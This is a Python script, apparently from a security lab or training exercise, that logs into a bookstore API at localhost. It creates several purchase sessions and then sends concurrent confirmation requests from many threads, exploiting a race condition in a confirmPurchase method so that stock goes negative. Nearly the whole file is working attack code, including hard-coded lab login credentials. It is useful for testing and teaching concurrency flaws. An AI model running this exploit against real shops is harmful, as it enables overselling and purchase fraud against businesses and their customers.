#!/usr/bin/env python3
"""
DIRECT SESSION CONFIRMATION ATTACK - Race Condition Test
Creates sessions first, then attacks them simultaneously to trigger race conditions
"""

import requests
import threading
import time
import argparse
import json
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys

class DirectSessionAttackTester:
    def __init__(self, base_url="http://localhost:8080", book_id="1", 
                 email="alice@secchamp.com", password="password123"):
        self.base_url = base_url
        self.book_id = book_id
        self.email = email
        self.password = password
        self.token = None
        self.session = requests.Session()
        # Attack settings
        self.session.timeout = 3  # Shorter timeout for attack speed
        
    def login(self):
        """Authenticate and get JWT token"""
        login_url = f"{self.base_url}/api/auth/login"
        login_data = {
            "email": self.email,
            "password": self.password
        }
        
        try:
            response = self.session.post(login_url, json=login_data, timeout=10)
            response.raise_for_status()
            
            login_response = response.json()
            self.token = login_response.get("token")
            
            if not self.token:
                raise Exception("No token received from login response")
                
            print("✅ Login OK, token received")
            
            # Get initial stock for reference
            try:
                stock_url = f"{self.base_url}/api/books/{self.book_id}"
                stock_response = self.session.get(stock_url, headers={"Authorization": f"Bearer {self.token}"}, timeout=5)
                if stock_response.status_code == 200:
                    stock_data = stock_response.json()
                    initial_stock = stock_data.get("stock", "unknown")
                    print(f"📊 Initial stock for Book ID {self.book_id}: {initial_stock}")
            except:
                print("⚠️  Could not get initial stock, proceeding anyway...")
            
            return True
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Login failed: {e}")
            return False
    
    def create_sessions(self, num_sessions=5):
        """Create multiple purchase sessions first"""
        print(f"\n📝 PHASE 1: Creating {num_sessions} purchase sessions...")
        sessions = []
        
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        
        for i in range(1, num_sessions + 1):
            try:
                initiate_url = f"{self.base_url}/api/purchase/book"
                initiate_data = {"bookId": self.book_id}
                
                initiate_response = self.session.post(initiate_url, json=initiate_data, headers=headers, timeout=10)
                
                if initiate_response.status_code == 200:
                    initiate_data = initiate_response.json()
                    session_id = initiate_data.get("sessionId")
                    book_title = initiate_data.get("bookTitle", "N/A")
                    
                    if session_id:
                        sessions.append({
                            "sessionId": session_id,
                            "bookTitle": book_title,
                            "created": True
                        })
                        print(f"  ✅ Session {i} created: {session_id}")
                    else:
                        print(f"  ❌ Session {i}: No session ID received")
                else:
                    error_data = {}
                    try:
                        error_data = initiate_response.json()
                    except:
                        pass
                    print(f"  ❌ Session {i}: HTTP {initiate_response.status_code} - {error_data.get('message', 'Unknown error')}")
                    
            except Exception as e:
                print(f"  ❌ Session {i}: {str(e)}")
        
        print(f"\n📊 Created {len(sessions)} sessions ready for attack")
        return sessions
    
    def attack_sessions(self, sessions, thread_id):
        """Attack all sessions simultaneously"""
        results = []
        
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        
        # Each thread attacks ALL sessions simultaneously
        for session in sessions:
            try:
                confirm_url = f"{self.base_url}/api/purchase/confirm"
                confirm_data = {"sessionId": session["sessionId"]}
                
                confirm_response = self.session.post(confirm_url, json=confirm_data, headers=headers, timeout=5)
                
                if confirm_response.status_code == 200:
                    confirm_result = confirm_response.json()
                    results.append({
                        "success": True,
                        "stock": confirm_result.get("remainingStock", 0),
                        "thread_id": thread_id,
                        "session_id": session["sessionId"],
                        "message": confirm_result.get("message", ""),
                        "title": session["bookTitle"],
                        "price": confirm_result.get("price", 0),
                        "attack_type": "simultaneous-confirm"
                    })
                else:
                    error_data = {}
                    try:
                        error_data = confirm_response.json()
                    except:
                        pass
                        
                    results.append({
                        "success": False,
                        "error": f"Confirm failed: HTTP {confirm_response.status_code}",
                        "thread_id": thread_id,
                        "session_id": session["sessionId"],
                        "details": error_data.get("message", confirm_response.text[:200]),
                        "status_code": confirm_response.status_code,
                        "attack_type": "simultaneous-confirm"
                    })
                    
            except Exception as e:
                results.append({
                    "success": False,
                    "error": str(e),
                    "thread_id": thread_id,
                    "session_id": session["sessionId"],
                    "details": "Request exception occurred",
                    "status_code": "N/A",
                    "attack_type": "simultaneous-confirm"
                })
        
        return results
    
    def run_direct_attack(self, num_threads=20, num_sessions=5):
        """Run the DIRECT SESSION CONFIRMATION ATTACK"""
        print(f"\n🎯 DIRECT SESSION CONFIRMATION ATTACK - Race Condition Test")
        print(f"Strategy: Create {num_sessions} sessions, then attack them with {num_threads} threads")
        print("This bypasses session locking and directly targets the vulnerable confirmPurchase method")
        
        # Login first
        if not self.login():
            return False
        
        # Phase 1: Create sessions
        sessions = self.create_sessions(num_sessions)
        
        if not sessions:
            print("❌ No sessions created, cannot proceed with attack")
            return False
        
        # Phase 2: Attack all sessions simultaneously
        print(f"\n🚀 PHASE 2: Attacking all {len(sessions)} sessions with {num_threads} concurrent threads!")
        
        all_results = []
        
        # Use ThreadPoolExecutor for simultaneous attack
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Submit all attack tasks simultaneously
            future_to_thread = {
                executor.submit(self.attack_sessions, sessions, thread_id): thread_id
                for thread_id in range(1, num_threads + 1)
            }
            
            # Collect results as they complete
            for future in as_completed(future_to_thread):
                thread_id = future_to_thread[future]
                try:
                    thread_results = future.result()
                    all_results.extend(thread_results)
                except Exception as e:
                    print(f"❌ Thread {thread_id} failed: {e}")
        
        # Analyze results
        self.analyze_attack_results(all_results, num_threads, num_sessions)
        return True
    
    def analyze_attack_results(self, results, num_threads, num_sessions):
        """Analyze direct attack results"""
        successful = len([r for r in results if r.get("success")])
        failed = len([r for r in results if not r.get("success")])
        
        # Get stock levels from successful requests
        stock_levels = sorted(set([r["stock"] for r in results if r.get("success") and "stock" in r]))
        
        print(f"\n📊 ATTACK RESULTS:")
        print(f"Total Confirmation Attempts: {len(results)} ({num_threads} threads × {num_sessions} sessions)")
        print(f"✅ Successful Confirmations: {successful}")
        print(f"❌ Failed Confirmations: {failed}")
        
        # Show error analysis if there are failures
        if failed > 0:
            print(f"\n🔍 Error Analysis:")
            failed_results = [r for r in results if not r.get("success")]
            
            # Group errors by type
            error_groups = defaultdict(int)
            for result in failed_results:
                error = result.get("error", "Unknown error")
                error_groups[error] += 1
            
            for error, count in error_groups.items():
                print(f"  {count}x: {error}")
            
            # Show first 3 detailed errors
            print(f"\n📋 First 3 detailed errors:")
            for i, result in enumerate(failed_results[:3]):
                thread_id = result.get("thread_id", "N/A")
                session_id = result.get("session_id", "N/A")
                error = result.get("error", "Unknown")
                details = result.get("details", "")
                
                print(f"  Thread {thread_id} Session {session_id}: {error}")
                if details:
                    print(f"    Details: {details}")
        
        # Stock level analysis
        if stock_levels:
            print(f"\n📈 Stock levels observed: {', '.join(map(str, stock_levels))}")
            min_stock = min(stock_levels)
            max_stock = max(stock_levels)
            print(f"📊 Stock range: {max_stock} → {min_stock}")
            
            if min_stock < 0:
                print(f"\n🚨 RACE CONDITION DETECTED! Negative stock achieved: {min_stock}")
                print("🎯 This proves the confirmPurchase method allows overselling!")
                print("💥 Multiple threads successfully decremented stock simultaneously")
            else:
                print(f"\n✅ Stock stayed non-negative: {min_stock}")
                print("⚠️  Race condition may still exist - try increasing threads or sessions")
                print("💡 Try: python race_test_fixed.py --threads 50 --sessions 10")
        else:
            print(f"\n⚠️  No stock levels recorded due to all failures")
            print(f"🔧 Check server status and session validity")
        
        print(f"\n🎯 Attack Strategy Summary:")
        print(f"  • Created {num_sessions} sessions first")
        print(f"  • Attacked all sessions with {num_threads} concurrent threads")
        print(f"  • Total confirmation attempts: {len(results)}")
        print("  • This directly targets the vulnerable confirmPurchase method")

def main():
    """Main function with command line argument parsing"""
    parser = argparse.ArgumentParser(description="DIRECT SESSION CONFIRMATION ATTACK - Race Condition Test")
    parser.add_argument("--threads", "-t", type=int, default=20, 
                       help="Number of concurrent threads (default: 20)")
    parser.add_argument("--sessions", "-s", type=int, default=5,
                       help="Number of purchase sessions to create and attack (default: 5)")
    parser.add_argument("--url", "-u", type=str, default="http://localhost:8080",
                       help="Base URL of the application (default: http://localhost:8080)")
    parser.add_argument("--book-id", "-b", type=str, default="1",
                       help="Book ID to test with (default: 1)")
    parser.add_argument("--email", "-e", type=str, default="alice@secchamp.com",
                       help="Login email (default: alice@secchamp.com)")
    parser.add_argument("--password", "-w", type=str, default="password123",
                       help="Login password (default: password123)")
    
    args = parser.parse_args()
    
    print("🧪 DIRECT SESSION ATTACK - Race Condition Tester")
    print("=" * 55)
    
    # Create tester instance
    tester = DirectSessionAttackTester(
        base_url=args.url,
        book_id=args.book_id,
        email=args.email,
        password=args.password
    )
    
    # Run the attack
    try:
        success = tester.run_direct_attack(args.threads, args.sessions)
        if not success:
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⚠️  Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
